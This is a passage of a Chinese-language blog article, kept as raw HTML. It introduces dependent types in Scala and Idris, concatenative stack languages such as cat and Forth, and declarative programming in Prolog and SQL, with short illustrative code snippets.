style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nval l1 = 1 :#: 2 :#: 3 :#: VNil\r\nval l2 = 1 :#: 2 :#: 3 :#: VNil\r\n \r\nval l3 = l1 vAdd l2\r\n \r\n// Result: l3 = 2 :#: 4 :#: 6 :#: VNil</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e4d534640220-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e4d534640220-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e4d534640220-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e4d534640220-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e4d534640220-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e4d534640220-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ef41e4d534640220-1\"><span class=\"crayon-e\">val </span><span class=\"crayon-v\">l1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-p\">#: 2 :#: 3 :#: VNil</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e4d534640220-2\"><span class=\"crayon-e\">val </span><span class=\"crayon-v\">l2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-p\">#: 2 :#: 3 :#: VNil</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e4d534640220-3\"><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e4d534640220-4\"><span class=\"crayon-e\">val </span><span class=\"crayon-v\">l3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">l1 </span><span class=\"crayon-e\">vAdd </span><span class=\"crayon-v\">l2</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e4d534640220-5\"><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e4d534640220-6\"><span class=\"crayon-c\">// Result: l3 = 2 :#: 4 :#: 6 :#: VNil</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>上面的例子正常运行，因为类型系统知道两个 <code>Vectors</code> 的长度都为 3。然而，如果我们尝试 <code>vAdd</code> 两个长度不同的 <code>Vectors</code>，我们会在编译时得到一个错误，而不必等到运行时。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ef41e51561802273\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nval l1 = 1 :#: 2 :#: 3 :#: VNil\r\nval l2 = 1 :#: 2 :#: VNil\r\n \r\nval l3 = l1 vAdd l2\r\n \r\n// Result: a *compile* error because you can't pairwise add vectors \r\n// of different lengths!</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e51561802273-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e51561802273-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e51561802273-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e51561802273-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e51561802273-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e51561802273-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e51561802273-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ef41e51561802273-1\"><span class=\"crayon-e\">val </span><span class=\"crayon-v\">l1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-p\">#: 2 :#: 3 :#: VNil</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e51561802273-2\"><span class=\"crayon-e\">val </span><span class=\"crayon-v\">l2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-p\">#: 2 :#: VNil</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e51561802273-3\"><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e51561802273-4\"><span class=\"crayon-e\">val </span><span class=\"crayon-v\">l3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">l1 </span><span class=\"crayon-e\">vAdd </span><span class=\"crayon-v\">l2</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e51561802273-5\"><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e51561802273-6\"><span class=\"crayon-c\">// Result: a *compile* error because you can't pairwise add vectors </span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e51561802273-7\"><span class=\"crayon-c\">// of different lengths!</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>Shapeless 是一个了不起的库，但就我所看到的，它仍然有点粗糙，只支持依赖类型的一个子集，并导致生成相当详细的代码和类型签名。另一方面，<a href=\"http://www.idris-lang.org/\" target=\"_blank\" rel=\"nofollow\">Idris</a> 使类型成为编程语言的首要成员，因此它的依赖类型系统看起来更强大和更干净。为了比较，请查看演讲 — <a href=\"http://www.infoq.com/presentations/scala-idris\" target=\"_blank\" rel=\"nofollow\">Scala vs Idris: Dependent Types, Now and in the Future</a> 。</p>\n<p><a href=\"http://en.wikipedia.org/wiki/Formal_verification\" target=\"_blank\" rel=\"nofollow\">形式化验证方法</a>已经存在很长一段时间了，但大多数情况下都十分麻烦，无法用于通用编程。依赖类型在像 Idris 这样的语言中，甚至在未来的 Scala 中，可能会提供更轻量的和更实用的替代方案，这仍然能大大提高类型系统提供捕获错误的能力。当然，没有类型系统可以捕获所有的错误，由于终止（halting）问题的固有局限性，但如果做得好，依赖类型可能是静态类型系统下一个大的飞跃。</p>\n<p> </p>\n<h3><strong>Concatenative 语言</strong></h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/10c2374341c05901cc095e52c66d3e51.jpg\" alt=\"\" width=\"160\" height=\"108\"></p>\n<p>示例语言：<a href=\"http://www.forth.com/forth/\" target=\"_blank\" rel=\"nofollow\">Forth</a>, <a href=\"http://www.cat-language.com/\" target=\"_blank\" rel=\"nofollow\">cat</a>, <a href=\"http://c2.com/cgi/wiki?JoyLanguage\" target=\"_blank\" rel=\"nofollow\">joy</a></p>\n<p>有没有想过在没有变量和函数应用的情况下编程是一种怎样的体验？没有？我也没试过。但显然有些人做了，他们提出了 <a href=\"http://en.wikipedia.org/wiki/Concatenative_programming_language\" rel=\"nofollow\">concatenative 编程</a>这个概念。这个概念背后的思想是语言中的所有内容都是一个函数，用于将数据推送到堆栈或从堆栈弹出数据；程序几乎完全通过功能组合来构建（<a href=\"http://concatenative.org/wiki/view/Concatenative%20language/Concatenation%20is%20composition\" rel=\"nofollow\">concatenation is composition</a>）。简单的说即是基于堆栈的编程语言。</p>\n<p>这听起来很抽象，所以让我们来看一个简单的例子：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ef41e55258273125\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n2 3 +</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e55258273125-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ef41e55258273125-1\"><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>在这里，我们将两个数字推到堆栈上，然后调用 <code>+</code> 函数，它将两个数字从堆栈中弹出，并将结果添加到堆栈中：代码的输出是 5。这里有一个更有趣的例子：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ef41e58170064642\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef foo {\r\n  10 &lt;\r\n  [ 0 ]\r\n  [ 42 ]\r\n  if\r\n}\r\n \r\n20\r\nfoo</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e58170064642-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e58170064642-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e58170064642-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e58170064642-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e58170064642-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e58170064642-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e58170064642-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e58170064642-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e58170064642-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ef41e58170064642-1\"><span class=\"crayon-e\">def</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">foo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e58170064642-2\"><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e58170064642-3\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e58170064642-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e58170064642-5\"><span class=\"crayon-h\">  </span><span class=\"crayon-st\">if</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e58170064642-6\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e58170064642-7\"><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e58170064642-8\"><span class=\"crayon-cn\">20</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e58170064642-9\"><span class=\"crayon-v\">foo</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>我们来一行一行看这段代码：</p>\n<ol>\n<li>首先，我们声明一个函数 <code>foo</code>。请注意，cat 中的函数不指定输入参数：所有参数从堆栈中隐式读取。</li>\n<li><code>foo</code> 调用 &lt;<code> 函数，它会弹出堆栈中的第一个选项，将其与 10 进行比较，并将 <code>True</code> 或 <code>False</code> 返回到堆栈。</code></li>\n<li>接下来，我们将值 0 和 42 推到堆栈上：我们将它们放在括号中，以确保它们被压入未被评估的堆栈。这是因为它们将被用作“then”和“else”分支（分别）用于调用下一行的 <code>if</code> 函数。</li>\n<li><code>if</code> 函数从堆栈中弹出 3 个选项：布尔条件，“then”分支和“else”分支。根据布尔条件的值，它会将“then”或“else”分支的结果推回堆栈。</li>\n<li>最后，我们将 20 推到堆栈并调用 <code>foo</code> 函数。</li>\n<li>当所有都完成了，我们最终会得到数字 42。</li>\n</ol>\n<p>有关这种语言更详细的介绍，请参阅 <a href=\"http://www.codecommit.com/blog/cat/the-joy-of-concatenative-languages-part-1\" target=\"_blank\" rel=\"nofollow\">The Joy of Concatenative Languages</a>。</p>\n<p>这种编程风格有一些有趣的属性：</p>\n<ul>\n<li>程序可通过无数的方式来分割和连接，以创建新的程序；</li>\n<li>极简的语法（甚至比 LISP 还小）产生了非常简洁的程序；</li>\n<li>强大的元编程支持</li>\n</ul>\n<p>我发现 concatenative 编程是一个非常开眼界的体验，但我还没实践过。似乎你必须记住或想象堆栈的当前状态，而不是能够从代码中的变量名读取它，这可能使得很难理解代码。</p>\n<p> </p>\n<h3><strong>声明式编程（Declarative programming）</strong></h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/7fe4a9d22babfc1db6d8f7eed34e0119.png\" alt=\"\" width=\"400\" height=\"400\"></p>\n<p>示例语言：<a href=\"http://en.wikipedia.org/wiki/Prolog\" target=\"_blank\" rel=\"nofollow\">Prolog</a>, <a href=\"http://en.wikipedia.org/wiki/SQL\" target=\"_blank\" rel=\"nofollow\">SQL</a></p>\n<p><a href=\"http://en.wikipedia.org/wiki/Declarative_programming\" target=\"_blank\" rel=\"nofollow\">声明式编程</a>已经存在了很多年，但大多数程序员仍不知道它是一个怎样的概念。简要来说：在大多数主流语言中，你是在描述如何解决特定的问题；在声明式语言中，你只需描述所需的结果，语言本身可推导出结果。</p>\n<p>例如，如果你在 C 语言中从头开始编写排序算法，你会编写合并排序的说明，逐步描述如何递归地将数据集分为两部分并按顺序将其合并到一起：<a href=\"http://www.cs.cityu.edu.hk/~lwang/ccs4335/mergesort.c\" target=\"_blank\" rel=\"nofollow\">这里是一个例子</a>。如果使用声明式语言如 <a href=\"http://en.wikipedia.org/wiki/Prolog\" target=\"_blank\" rel=\"nofollow\">Prolog</a> 对数字进行排序，可以直接描述你需要的输出：“我想要相同的值列表，但索引 <code>i</code> 中的每个项目应小于或等于索引 <code>i + 1</code> 中的项目”。将上面 C 语言的解决方案和 Prolog 代码进行比较：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ef41e5e094096092\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsort_list(Input, Output) :-\r\n  permutation(Input, Output),\r\n  check_order(Output).\r\n  \r\ncheck_order([]).\r\ncheck_order([Head]).\r\ncheck_order([First, Second | Tail]) :-\r\n  First =&lt; Second,\r\n  check_order([Second | Tail]).</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e5e094096092-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e5e094096092-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e5e094096092-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e5e094096092-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e5e094096092-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e5e094096092-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e5e094096092-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e5e094096092-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e5e094096092-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ef41e5e094096092-1\"><span class=\"crayon-e\">sort_list</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Input</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Output</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e5e094096092-2\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">permutation</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Input</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Output</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e5e094096092-3\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">check_order</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Output</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e5e094096092-4\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e5e094096092-5\"><span class=\"crayon-e\">check_order</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e5e094096092-6\"><span class=\"crayon-e\">check_order</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">Head</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e5e094096092-7\"><span class=\"crayon-e\">check_order</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">First</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Second</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Tail</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e5e094096092-8\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">First</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Second</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e5e094096092-9\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">check_order</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">Second</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Tail</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p>如果你使用过 SQL，那么你已经使用了声明式编程，可能自己没有意识到这一点：当你发出一个像 <code>select X from Y where Z</code> 这样的查询，你就是在描述你想要返回的数据集；数据库引擎的工作实际上是如何执行查询。你可以在大多数数据库中使用 explain 